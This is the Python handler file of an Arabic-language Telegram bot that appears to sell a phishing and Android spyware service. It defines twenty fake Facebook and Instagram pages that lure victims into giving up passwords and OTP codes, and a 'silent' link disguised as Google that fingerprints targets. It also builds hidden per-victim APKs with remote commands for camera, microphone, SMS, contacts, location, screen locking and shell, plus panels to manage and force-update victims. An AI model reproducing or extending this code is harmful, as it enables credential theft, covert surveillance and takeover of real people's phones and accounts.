# bot_handlers.py
# ============================================================
# معالجات البوت الرئيسية: /start + callback + step handlers
# v14 — ترحيب مبسط + شرح البوت + Phone Search
# ============================================================

import io
import html
import time
import uuid
import json
import threading
import requests
from datetime import datetime
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

from config import (
    bot, redis_client, PUBLIC_URL, RAILWAY_URL,
    GITHUB_TOKEN, GITHUB_REPO,
)
from utils import trigger_victim_apk_build, get_victim_apk_url

from imports_manager import (
    # Payment / Admin
    get_or_create_user, can_use_tool, consume_usage,
    build_plans_keyboard, build_main_payment_keyboard,
    build_account_text, build_plans_text, send_invoice,
    PRICING_PLANS, FREE_TRIAL_USES, AVAILABLE_TOOLS,
    is_admin, is_vip, get_all_users, get_user, save_user,
    delete_user, ban_user, unban_user, activate_subscription,
    build_admin_menu, build_admin_users_keyboard,
    build_user_detail_keyboard, build_user_info_text,
    build_admin_stats_text,
    # Victims
    create_victim, get_victim, get_all_victims, delete_victim,
    update_victim_status, rename_victim,
    queue_victim_command,
    # APK Manager
    build_apk_panel, push_apk_command,
    # Silent Collector
    generate_silent_link,
    get_silent_data,
    get_user_silent_sessions,
)

from logging_config import get_logger
from monitoring import metrics

logger = get_logger("bot_handlers")


# ============================================================
# Escape HTML
# ============================================================
def h(text):
    if text is None:
        return ""
    return html.escape(str(text))


# ============================================================
# Safe Edit Helper
# ============================================================
def safe_edit(call, text, reply_markup=None, parse_mode="HTML"):
    """يحاول يعدل الرسالة، ولو فشل يبعت رسالة جديدة"""
    try:
        bot.edit_message_text(
            text=text,
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            reply_markup=reply_markup,
            parse_mode=parse_mode,
            disable_web_page_preview=True,
        )
        return True
    except Exception as e:
        err = str(e).lower()
        if "message is not modified" in err:
            return True
        if "message to edit not found" in err or "message can't be edited" in err:
            try:
                bot.send_message(
                    call.message.chat.id,
                    text,
                    reply_markup=reply_markup,
                    parse_mode=parse_mode,
                    disable_web_page_preview=True,
                )
                return True
            except Exception as e2:
                logger.warning(f"safe_edit fallback error: {e2}")
        else:
            logger.debug(f"safe_edit error: {e}")
        return False


# ============================================================
# إعدادات التحديث
# ============================================================
try:
    from config import ORIGIN_SECRET
except ImportError:
    ORIGIN_SECRET = ""

try:
    from apk_updater import (
        CURRENT_VERSION_CODE,
        CURRENT_VERSION_NAME,
        _find_latest_apk_release,
        _get_cached_apk_info,
    )
except ImportError:
    CURRENT_VERSION_CODE = 1
    CURRENT_VERSION_NAME = "1.0.0"
    def _find_latest_apk_release():
        return None
    def _get_cached_apk_info():
        return None


# ============================================================
# ★★★ Facebook Fake Sites Templates ★★★
# ============================================================
FACEBOOK_SITES = {
    "01_login": {
        "emoji": "🔐",
        "name": "تسجيل دخول فيسبوك",
        "desc": "الصفحة الرسمية لتسجيل الدخول إلى فيسبوك.\nتظهر بنسبة 95% مطابقة للأصل.",
    },
    "02_recovery": {
        "emoji": "🔄",
        "name": "استرداد حساب",
        "desc": "يوهم الضحية بمحاولة اختراق لحسابها.\nيطلب منها كلمة المرور لمنع الاختراق.",
    },
    "03_verify": {
        "emoji": "✅",
        "name": "تحقق من الحساب",
        "desc": "صفحة OTP لتحقق أمني.\nتطلب كود التحقق المرسل على الهاتف.",
    },
    "04_ads": {
        "emoji": "📊",
        "name": "Ads Manager",
        "desc": "لوحة تحكم إعلانات Meta المزيفة.\nتستهدف أصحاب البيزنس والإعلانات.",
    },
    "05_business": {
        "emoji": "💼",
        "name": "Business Suite",
        "desc": "أدوات إدارة صفحات العمل.\nتستهدف أصحاب الصفحات والمشاريع.",
    },
    "06_marketplace": {
        "emoji": "🛒",
        "name": "Marketplace",
        "desc": "منتج مغري للبيع في Marketplace.\nتستهدف أي شخص يبحث عن شراء.",
    },
    "07_groups": {
        "emoji": "👥",
        "name": "Facebook Groups",
        "desc": "مجموعة وظائف أو خاصة.\nتستهدف الباحثين عن عمل.",
    },
    "08_dating": {
        "emoji": "❤️",
        "name": "Facebook Dating",
        "desc": "منصة تعارف مع عرض خاص.\nتستهدف الشباب والشابات.",
    },
    "09_gaming": {
        "emoji": "🎮",
        "name": "Facebook Gaming",
        "desc": "مكافآت ألعاب و Drops مجانية.\nتستهدف اللاعبين.",
    },
    "10_creator": {
        "emoji": "🎬",
        "name": "Creator Studio",
        "desc": "أدوات صنّاع المحتوى الاحترافية.\nتستهدف اليوتيوبرز والمؤثرين.",
    },
}


# ============================================================
# ★★★ Instagram Fake Sites Templates ★★★
# ============================================================
INSTAGRAM_SITES = {
    "01_login": {
        "emoji": "🔐",
        "name": "تسجيل دخول Instagram",
        "desc": "الصفحة الرسمية لتسجيل الدخول إلى Instagram.\nتصميم نظيف بنسبة 95% مطابقة للأصل.",
    },
    "02_giveaway": {
        "emoji": "🎁",
        "name": "مسابقة Giveaway",
        "desc": "مسابقة وهمية بجائزة $5,000 + iPhone.\nتصميم احتفالي بألوان gradient.",
    },
    "03_verify": {
        "emoji": "✅",
        "name": "التوثيق الأزرق",
        "desc": "يوهم الضحية بالحصول على الشارة الزرقاء.\nتصميم رسمي بألوان Meta Blue.",
    },
    "04_creator_fund": {
        "emoji": "💰",
        "name": "صندوق المبدعين",
        "desc": "يوهم الضحية بأرباح متبقية للسحب.\nتصميم مالي مع إحصائيات.",
    },
    "05_copyright": {
        "emoji": "📸",
        "name": "تحذير حقوق النشر",
        "desc": "يوهم الضحية بانتهاك حقوق النشر.\nتصميم رسمي أحمر بأسلوب DMCA.",
    },
    "06_reels_bonus": {
        "emoji": "🎬",
        "name": "مكافآت Reels",
        "desc": "مكافآت شهرية من Reels.\nتصميم بنفسجي بلمسة ذهبية.",
    },
    "07_pro_dashboard": {
        "emoji": "📊",
        "name": "لوحة احترافية",
        "desc": "لوحة تحليلات احترافية.\nتصميم رمادي-أزرق مع رسوم بيانية.",
    },
    "08_login_alert": {
        "emoji": "🔒",
        "name": "تنبيه تسجيل دخول",
        "desc": "تنبيه بمحاولة اختراق.\nتصميم داكن بأيقونة تنبيه.",
    },
    "09_dating": {
        "emoji": "❤️",
        "name": "Instagram Dating",
        "desc": "تعارف مع عرض خاص.\nتصميم وردي-بنفسجي بأسلوب Netflix.",
    },
    "10_shopping": {
        "emoji": "🛍️",
        "name": "Instagram Shopping",
        "desc": "متجر بعروض حصرية بخصم 70%.\nتصميم برتقالي مع منتجات.",
    },
}


# ============================================================
# إنشاء جلسات
# ============================================================
def _create_fb_session(chat_id, template_key):
    if not redis_client:
        return None
    try:
        session_id = uuid.uuid4().hex[:16]
        now = time.time()
        session_data = {
            "session_id": session_id,
            "chat_id": str(chat_id),
            "type": "facebook",
            "template": template_key,
            "created_at": now,
            "accessed": False,
            "collected": False,
            "label": FACEBOOK_SITES.get(template_key, {}).get('name', 'Facebook'),
        }
        redis_client.setex(
            f"se_session:{session_id}",
            86400 * 30,
            json.dumps(session_data, ensure_ascii=False)
        )
        redis_client.lpush(f"se_user_sessions:{chat_id}", session_id)
        redis_client.ltrim(f"se_user_sessions:{chat_id}", 0, 199)
        redis_client.expire(f"se_user_sessions:{chat_id}", 86400 * 30)
        logger.info(f"FB Session created: {session_id} | {template_key}")
        metrics.inc_counter("fb_sessions_created")
        return session_id
    except Exception as e:
        logger.exception(f"_create_fb_session error: {e}")
        return None


def _create_ig_session(chat_id, template_key):
    if not redis_client:
        return None
    try:
        session_id = uuid.uuid4().hex[:16]
        now = time.time()
        session_data = {
            "session_id": session_id,
            "chat_id": str(chat_id),
            "type": "instagram",
            "template": template_key,
            "created_at": now,
            "accessed": False,
            "collected": False,
            "label": INSTAGRAM_SITES.get(template_key, {}).get('name', 'Instagram'),
        }
        redis_client.setex(
            f"se_session:{session_id}",
            86400 * 30,
            json.dumps(session_data, ensure_ascii=False)
        )
        redis_client.lpush(f"se_user_sessions:{chat_id}", session_id)
        redis_client.ltrim(f"se_user_sessions:{chat_id}", 0, 199)
        redis_client.expire(f"se_user_sessions:{chat_id}", 86400 * 30)
        logger.info(f"IG Session created: {session_id} | {template_key}")
        metrics.inc_counter("ig_sessions_created")
        return session_id
    except Exception as e:
        logger.exception(f"_create_ig_session error: {e}")
        return None


# ============================================================
# القوائم
# ============================================================
def main_menu(user_id=None):
    """القائمة الرئيسية"""
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("👥 إدارة الضحايا", callback_data="v_list"))
    markup.add(InlineKeyboardButton("📱 تطبيق الضحية (APK)", callback_data="v_new"))

    markup.add(InlineKeyboardButton(
        "🌐 لوحة التحكم (ويب)",
        callback_data="open_dashboard"
    ))

    markup.add(InlineKeyboardButton(
        "🎭 الهندسة الاجتماعية",
        callback_data="gen_se"
    ))

    markup.add(InlineKeyboardButton(
        "🔍 محرك البحث",
        callback_data="search_menu"
    ))

    markup.add(InlineKeyboardButton("🎯 جمع المعلومات (Silent)", callback_data="gen_silent"))
    markup.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
    markup.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))

    # ★★★ زر شرح البوت ★★★
    markup.add(InlineKeyboardButton(
        "📖 شرح البوت",
        callback_data="help_guide"
    ))

    markup.add(InlineKeyboardButton("💎 الاشتراكات والدفع", callback_data="payment_menu"))
    markup.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))

    if user_id and is_admin(user_id):
        markup.add(InlineKeyboardButton("👑 لوحة تحكم الأدمن", callback_data="admin_panel"))

    return markup


def main_menu_text(user_id=None):
    """نص القائمة الرئيسية"""
    if user_id and is_admin(user_id):
        return (
            "👑 <b>القائمة الرئيسية</b>\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "⚡ صلاحيات كاملة\n"
            "💎 VIP لا نهائي\n\n"
            "🎯 اختر أداة:"
        )
    return (
        "⚡ <b>القائمة الرئيسية</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "🎯 اختر أداة:"
    )


def silent_collector_panel():
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("➕ لينك جديد", callback_data="silent_new"))
    m.add(InlineKeyboardButton("📊 الإحصائيات", callback_data="silent_stats"))
    m.add(InlineKeyboardButton("📋 آخر النتائج", callback_data="silent_recent"))
    m.add(InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back_to_main"))
    return m


# ============================================================
# Search Engine Panel
# ============================================================
def build_search_menu():
    m = InlineKeyboardMarkup()

    m.add(InlineKeyboardButton("📱 بحث برقم الهاتف ✨", callback_data="search_phone"))
    m.add(InlineKeyboardButton("📧 بحث بالإيميل 🔒", callback_data="search_email_soon"))
    m.add(InlineKeyboardButton("👤 بحث باسم المستخدم 🔒", callback_data="search_username_soon"))
    m.add(InlineKeyboardButton("📘 بحث بفيسبوك 🔒", callback_data="search_fb_soon"))
    m.add(InlineKeyboardButton("📷 بحث بانستقرام 🔒", callback_data="search_ig_soon"))

    m.add(InlineKeyboardButton("📜 سجل البحثات", callback_data="search_history"))
    m.add(InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back_to_main"))

    return m


def build_facebook_sites_panel():
    m = InlineKeyboardMarkup()
    for key, tpl in FACEBOOK_SITES.items():
        m.add(InlineKeyboardButton(
            f"{tpl['emoji']} {tpl['name']}",
            callback_data=f"fb_site_{key}"
        ))
    m.add(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main"))
    return m


def build_instagram_sites_panel():
    m = InlineKeyboardMarkup()
    for key, tpl in INSTAGRAM_SITES.items():
        m.add(InlineKeyboardButton(
            f"{tpl['emoji']} {tpl['name']}",
            callback_data=f"ig_site_{key}"
        ))
    m.add(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main"))
    return m


# ============================================================
# ★★★ Help Guide — شرح البوت ★★★
# ============================================================
HELP_PAGES = [
    {
        "title": "📖 شرح البوت - الجزء 1",
        "subtitle": "نظرة عامة على الأدوات المتاحة",
        "content": (
            "🔍 <b>محرك البحث</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "• <b>بحث برقم الهاتف</b>: تحصل على معلومات الرقم من مصادر مفتوحة + خرائط + روابط مباشرة\n"
            "• <b>بحث بالإيميل</b>: (قريباً)\n"
            "• <b>بحث باسم المستخدم</b>: (قريباً)\n"
            "• <b>بحث بفيسبوك / انستقرام</b>: (قريباً)\n\n"

            "🎭 <b>الهندسة الاجتماعية</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "• <b>واتساب</b>: 10 قوالب رسائل جاهزة للتصيد\n"
            "• <b>البريد الإلكتروني</b>: 10 قوالب احترافية\n"
            "• أقسام أخرى قادمة قريباً\n\n"

            "🎯 <b>جمع المعلومات (Silent)</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "• ينشئ رابط يبدو كأنه Google\n"
            "• يجمع بصمة كاملة عن الضحية\n"
            "• IP + Device + Cookies + Browsers"
        ),
    },
    {
        "title": "📖 شرح البوت - الجزء 2",
        "subtitle": "أنظمة APK والضحايا",
        "content": (
            "📱 <b>تطبيق الضحية (APK)</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "• تبني APK مخصص لكل ضحية\n"
            "• يستقبل الأوامر من البوت\n"
            "• يشتغل في الخلفية بدون إشعار\n\n"

            "👥 <b>إدارة الضحايا</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "• عند كل ضحية: <b>40+ أمر</b>\n"
            "• 📷 كاميرا (أمامية/خلفية)\n"
            "• 🎙️ تسجيل صوتي\n"
            "• 📨 SMS + سجل المكالمات\n"
            "• 👥 جهات الاتصال + التطبيقات\n"
            "• 🖼️ الصور + الفيديوهات\n"
            "• 📍 الموقع + WiFi\n"
            "• 📋 الحافظة + التنبيهات\n"
            "• 🔒 قفل الشاشة + Shell\n\n"

            "🔗 <b>روابط التصيد</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "• <b>فيسبوك</b>: 10 قوالب لصفحات دخول\n"
            "• <b>انستقرام</b>: 10 قوالب احترافية\n"
            "• صفحة تشبه الأصل بنسبة 95%"
        ),
    },
    {
        "title": "📖 شرح البوت - الجزء 3",
        "subtitle": "لوحة التحكم والاشتراكات",
        "content": (
            "🌐 <b>لوحة التحكم (ويب)</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "• تدخل من أي متصفح\n"
            "• قائمة كل ضحاياك\n"
            "• إرسال أوامر مباشرة\n"
            "• صور وفيديوهات + خريطة\n"
            "• إحصائيات مفصلة\n"
            "• كل مستخدم له لوحة مستقلة\n\n"

            "💎 <b>الاشتراكات والدفع</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "• 💎 باقات متعددة\n"
            "• ⭐ دفع عبر Telegram Stars\n"
            "• 🎁 3 استخدامات مجانية في البداية\n"
            "• 🚀 VIP لكل الميزات بدون حدود\n\n"

            "👤 <b>حسابي</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "• حالة الحساب\n"
            "• الاستخدام المتاح\n"
            "• تفاصيل الاشتراك\n\n"

            "━━━━━━━━━━━━━━━━━━\n"
            "💡 <b>نصيحة:</b> ابدأ بالأدوات المجانية،\n"
            "وبعدين اشترك للمميزات الكاملة."
        ),
    },
]


def build_help_page(index):
    """يبني صفحة من صفحات الشرح"""
    if index < 0 or index >= len(HELP_PAGES):
        index = 0

    page = HELP_PAGES[index]

    text = (
        f"<b>{page['title']}</b>\n"
        f"<i>{page['subtitle']}</i>\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"{page['content']}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"📄 <b>الصفحة {index + 1}/{len(HELP_PAGES)}</b>"
    )

    m = InlineKeyboardMarkup()

    nav = []
    if index > 0:
        nav.append(InlineKeyboardButton(
            "⬅️ السابق",
            callback_data=f"help_page_{index - 1}"
        ))

    if index < len(HELP_PAGES) - 1:
        nav.append(InlineKeyboardButton(
            "التالي ➡️",
            callback_data=f"help_page_{index + 1}"
        ))

    if nav:
        m.row(*nav)

    m.add(InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="back_to_main"))

    return text, m


# ============================================================
# Victim Commands Panel
# ============================================================
def victim_commands_panel(victim_id):
    m = InlineKeyboardMarkup()

    m.row(
        InlineKeyboardButton("📷 كاميرا أمامية", callback_data=f"vcmd_camfront_{victim_id}"),
        InlineKeyboardButton("📸 كاميرا خلفية", callback_data=f"vcmd_camback_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("🎥 فيديو أمامية 10s", callback_data=f"vcmd_videofront_{victim_id}"),
        InlineKeyboardButton("🎥 فيديو خلفية 10s", callback_data=f"vcmd_videoback_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("🎙️ تسجيل صوت 10s", callback_data=f"vcmd_audio_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("🔔 نغمة", callback_data=f"vcmd_sound_{victim_id}"),
        InlineKeyboardButton("🚨 إنذار", callback_data=f"vcmd_alarm_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("📱 معلومات الجهاز", callback_data=f"vcmd_info_{victim_id}"),
        InlineKeyboardButton("🔋 البطارية", callback_data=f"vcmd_battery_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("📨 SMS", callback_data=f"vcmd_sms_{victim_id}"),
        InlineKeyboardButton("📞 سجل المكالمات", callback_data=f"vcmd_calls_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("👥 جهات الاتصال", callback_data=f"vcmd_contacts_{victim_id}"),
        InlineKeyboardButton("📲 التطبيقات", callback_data=f"vcmd_apps_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("🖼️ الصور", callback_data=f"vcmd_photos_{victim_id}"),
        InlineKeyboardButton("🎬 الفيديوهات", callback_data=f"vcmd_videos_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("📍 الموقع", callback_data=f"vcmd_location_{victim_id}"),
        InlineKeyboardButton("📶 معلومات WiFi", callback_data=f"vcmd_wifi_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("📋 الحافظة", callback_data=f"vcmd_clipboard_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("📳 اهتزاز", callback_data=f"vcmd_vibrate_{victim_id}"),
        InlineKeyboardButton("🔊 صوت أقصى", callback_data=f"vcmd_volmax_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("🔉 خفض الصوت", callback_data=f"vcmd_volmute_{victim_id}"),
        InlineKeyboardButton("⚡ صوت متوسط", callback_data=f"vcmd_volmid_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("⏯️ تشغيل/إيقاف", callback_data=f"vcmd_mediaplay_{victim_id}"),
        InlineKeyboardButton("⏭️ التالي", callback_data=f"vcmd_medianext_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("⏮️ السابق", callback_data=f"vcmd_mediaprev_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("🌑 إطفاء الشاشة", callback_data=f"vcmd_screenoff_{victim_id}"),
        InlineKeyboardButton("🔒 قفل كامل", callback_data=f"vcmd_lock_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("🏠 الرئيسية", callback_data=f"vcmd_home_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("✉️ إرسال SMS", callback_data=f"vcmd_sendsms_{victim_id}"),
        InlineKeyboardButton("📞 مكالمة", callback_data=f"vcmd_call_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("🌐 فتح رابط", callback_data=f"vcmd_url_{victim_id}"),
        InlineKeyboardButton("💬 Toast", callback_data=f"vcmd_toast_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("💻 Shell", callback_data=f"vcmd_shell_{victim_id}"),
    )
    m.row(
        InlineKeyboardButton("🔄 تحديث", callback_data=f"v_refresh_{victim_id}"),
        InlineKeyboardButton("✏️ تغيير الاسم", callback_data=f"v_rename_{victim_id}"),
    )
    m.row(InlineKeyboardButton("🗑️ حذف الضحية", callback_data=f"v_delete_{victim_id}"))
    m.row(InlineKeyboardButton("🔙 رجوع للضحايا", callback_data="v_list"))

    return m


def build_update_panel():
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("📊 حالة التحديث", callback_data="upd_status"))
    m.add(InlineKeyboardButton("🚀 إجبار كل الضحايا على التحديث", callback_data="upd_force_all"))
    m.add(InlineKeyboardButton("🎯 تحديث ضحية محددة", callback_data="upd_target"))
    m.row(
        InlineKeyboardButton("🔍 فحص آخر Release", callback_data="upd_check_release"),
        InlineKeyboardButton("♻️ مسح Cache", callback_data="upd_clear_cache"),
    )
    m.row(
        InlineKeyboardButton("📜 سجل التحديثات", callback_data="upd_history"),
        InlineKeyboardButton("⚙️ إعدادات", callback_data="upd_settings"),
    )
    m.add(InlineKeyboardButton("🔙 رجوع للأدمن", callback_data="admin_panel"))
    return m


def get_update_status_text():
    try:
        version_code = CURRENT_VERSION_CODE
        version_name = CURRENT_VERSION_NAME
        latest = _get_cached_apk_info() or _find_latest_apk_release()

        total_victims = 0
        if redis_client:
            try:
                keys = redis_client.keys("victim:*")
                total_victims = len(keys) if keys else 0
            except Exception:
                pass

        update_success = 0
        update_failed = 0
        if redis_client:
            try:
                update_success = int(redis_client.get("stats:update_success") or 0)
                update_failed = int(redis_client.get("stats:update_failed") or 0)
            except Exception:
                pass

        force_active = False
        if redis_client:
            try:
                force_active = bool(redis_client.get("apk_force_update"))
            except Exception:
                pass

        text = (
            "📊 <b>حالة نظام التحديث</b>\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "🔢 <b>النسخة الحالية على السيرفر:</b>\n"
            f"  • الكود: <code>{version_code}</code>\n"
            f"  • الاسم: <code>{version_name}</code>\n\n"
            "📦 <b>آخر Release على GitHub:</b>\n"
        )

        if latest:
            text += (
                f"  • الاسم: <code>{h(latest.get('version_name', '?'))}</code>\n"
                f"  • الحجم: <code>{latest.get('size', 0) / 1024 / 1024:.2f} MB</code>\n"
            )
        else:
            text += "  • <i>لا يوجد release</i>\n"

        text += (
            "\n👥 <b>الضحايا:</b>\n"
            f"  • الإجمالي: <code>{total_victims}</code>\n\n"
            "📈 <b>إحصائيات التحديث:</b>\n"
            f"  • ✅ نجح: <code>{update_success}</code>\n"
            f"  • ❌ فشل: <code>{update_failed}</code>\n\n"
            "🎯 <b>Force Update:</b>\n"
            f"  • الحالة: {'🔴 نشط' if force_active else '⚪ غير نشط'}\n"
        )

        return text
    except Exception as e:
        logger.exception(f"get_update_status_text error: {e}")
        return f"❌ خطأ في قراءة الحالة: {h(str(e)[:200])}"


def _deny_message(reason, user_id, tool, data=None):
    data = data or {}
    if reason == "banned":
        return "🚫 <b>أنت محظور.</b>"
    if reason == "daily_limit_reached":
        return f"⚠️ <b>وصلت للحد اليومي</b> ({data.get('daily_limit', 0)})."
    if reason == "no_credit":
        return (
            "❌ <b>لا يوجد لديك استخدام متاح.</b>\n\n"
            f"🎁 حصلت على {FREE_TRIAL_USES} استخدام مجاني.\n"
            "💎 اشترك للاستمرار."
        )
    return "❌ لا يمكن استخدام الأداة."


# ============================================================
# /start — ترحيب مبسط
# ============================================================
@bot.message_handler(commands=['start', 'panel'])
def start_command(message):
    logger.info(f"/start from {message.from_user.id}")
    metrics.inc_counter("bot_commands", tags={"cmd": "start"})

    user_name = message.from_user.first_name
    try:
        get_or_create_user(
            message.from_user.id,
            message.from_user.username or "Unknown",
            user_name
        )
    except Exception as e:
        logger.exception(f"get_or_create_user error: {e}")

    if is_admin(message.from_user.id):
        text = (
            f"👑 <b>مرحباً {h(user_name)}!</b>\n\n"
            f"⚡ صلاحيات كاملة.\n"
            f"💎 VIP لا نهائي.\n\n"
            f"🎛️ اختر أداة:"
        )
    else:
        text = (
            f"👋 <b>مرحباً بك {h(user_name)}!</b>\n\n"
            f"🎯 اختر الأداة التي تريدها:"
        )

    bot.send_message(
        message.chat.id, text,
        parse_mode="HTML",
        reply_markup=main_menu(message.from_user.id)
    )


# ============================================================
# /silent
# ============================================================
@bot.message_handler(commands=['silent', 'collect'])
def silent_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    logger.info(f"/silent from {user_id}")

    try:
        get_or_create_user(
            user_id,
            message.from_user.username or "Unknown",
            message.from_user.first_name or "User"
        )
    except Exception as e:
        logger.exception(f"get_or_create_user error: {e}")

    check = can_use_tool(chat_id, "silent")
    if not check["allowed"]:
        bot.send_message(
            chat_id,
            _deny_message(check["reason"], chat_id, "silent", check),
            parse_mode="HTML"
        )
        return

    consume_usage(chat_id, "silent")

    msg = bot.send_message(
        chat_id,
        "🎯 <b>جمع المعلومات</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "أرسل <b>اسم/وصف</b> للضحية\n"
        "مثال: <code>أحمد</code> أو <code>زميل الشغل</code>\n\n"
        "⏱️ الرابط صالح 30 يوم",
        parse_mode="HTML"
    )
    bot.register_next_step_handler(msg, silent_label_handler)


# ============================================================
# /dashboard
# ============================================================
@bot.message_handler(commands=['dashboard', 'dash', 'panel_web', 'web'])
def dashboard_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    logger.info(f"/dashboard from {user_id}")

    try:
        get_or_create_user(
            user_id,
            message.from_user.username or "Unknown",
            message.from_user.first_name or "User"
        )

        from web_dashboard import generate_magic_link

        link = generate_magic_link(user_id)

        if not link:
            bot.send_message(chat_id, "❌ فشل توليد الرابط، حاول مرة أخرى")
            return

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🚀 ادخل لوحة التحكم", url=link))

        bot.send_message(
            chat_id,
            "🌐 <b>لوحة التحكم الويب</b>\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "⏰ <i>الرابط صالح لمدة 5 دقائق فقط</i>\n"
            "🛡️ <i>لا تشاركه مع أي شخص</i>\n\n"
            "💡 <b>يحتوي على:</b>\n"
            "• قائمة ضحاياك مع الحالة\n"
            "• إرسال أوامر مباشرة\n"
            "• إحصائيات مفصلة",
            parse_mode="HTML",
            reply_markup=markup
        )
    except Exception as e:
        logger.exception(f"dashboard_command error: {e}")
        bot.send_message(chat_id, f"❌ خطأ: {h(str(e)[:100])}", parse_mode="HTML")


# ============================================================
# /update
# ============================================================
@bot.message_handler(commands=['update', 'updates', 'update_panel'])
def update_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id

    if not is_admin(user_id):
        bot.send_message(chat_id, "❌ للأدمن فقط")
        return

    logger.info(f"/update from admin {user_id}")

    text = (
        "⚙️ <b>إدارة التحديثات</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "🎯 اختر العملية:"
    )

    bot.send_message(chat_id, text, parse_mode="HTML",
                     reply_markup=build_update_panel())


# ============================================================
# Callback Handler
# ============================================================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id
    data = call.data

    try:
        _handle_callback(call, chat_id, user_id, data)
    except Exception as e:
        logger.exception(f"callback_handler error: {e}")
        metrics.inc_counter("bot_errors", tags={"type": "callback"})


def _handle_callback(call, chat_id, user_id, data):
    """المنطق الفعلي"""

    # ============================================================
    # ★★★ Help Guide ★★★
    # ============================================================
    if data == "help_guide":
        bot.answer_callback_query(call.id)
        text, m = build_help_page(0)
        safe_edit(call, text, reply_markup=m)
        return

    if data.startswith("help_page_"):
        try:
            page_index = int(data.replace("help_page_", ""))
        except ValueError:
            page_index = 0

        bot.answer_callback_query(call.id)
        text, m = build_help_page(page_index)
        safe_edit(call, text, reply_markup=m)
        return

    # ============================================================
    # ★★★ Search Engine ★★★
    # ============================================================
    if data == "search_menu":
        bot.answer_callback_query(call.id)
        safe_edit(
            call,
            "🔍 <b>محرك البحث</b>\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "🎯 <b>الأقسام المتاحة:</b> 5\n"
            "✅ <b>يعمل الآن:</b> بحث برقم الهاتف\n"
            "🚧 <b>قريباً:</b> إيميل + username + منصات\n\n"
            "💡 <i>اختر نوع البحث</i>",
            reply_markup=build_search_menu()
        )
        return

    if data == "search_phone":
        check = can_use_tool(chat_id, "phone_search")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            safe_edit(
                call,
                _deny_message(check["reason"], chat_id, "phone_search", check),
                reply_markup=build_search_menu()
            )
            return

        bot.answer_callback_query(call.id)

        msg = bot.send_message(
            chat_id,
            "📱 <b>البحث برقم الهاتف</b>\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "أرسل الرقم للبحث:\n\n"
            "• <code>01012345678</code>\n"
            "• <code>+201012345678</code>\n"
            "• <code>+1234567890</code>\n\n"
            "💡 <i>يدعم أي رقم (مصري أو دولي)</i>",
            parse_mode="HTML"
        )
        bot.register_next_step_handler(msg, phone_search_input_handler)
        return

    if data == "search_email_soon":
        bot.answer_callback_query(call.id, "🚧 قريباً...", show_alert=True)
        safe_edit(
            call,
            "📧 <b>البحث بالإيميل</b>\n\n"
            "🚧 <i>قيد التطوير</i>\n"
            "⏰ <i>سيتم إطلاقه قريباً</i>",
            reply_markup=build_search_menu()
        )
        return

    if data == "search_username_soon":
        bot.answer_callback_query(call.id, "🚧 قريباً...", show_alert=True)
        safe_edit(
            call,
            "👤 <b>البحث باسم المستخدم</b>\n\n"
            "🚧 <i>قيد التطوير</i>\n"
            "⏰ <i>سيتم إطلاقه قريباً</i>",
            reply_markup=build_search_menu()
        )
        return

    if data == "search_fb_soon":
        bot.answer_callback_query(call.id, "🚧 قريباً...", show_alert=True)
        safe_edit(
            call,
            "📘 <b>البحث بحساب فيسبوك</b>\n\n"
            "🚧 <i>قيد التطوير</i>\n"
            "⏰ <i>سيتم إطلاقه قريباً</i>",
            reply_markup=build_search_menu()
        )
        return

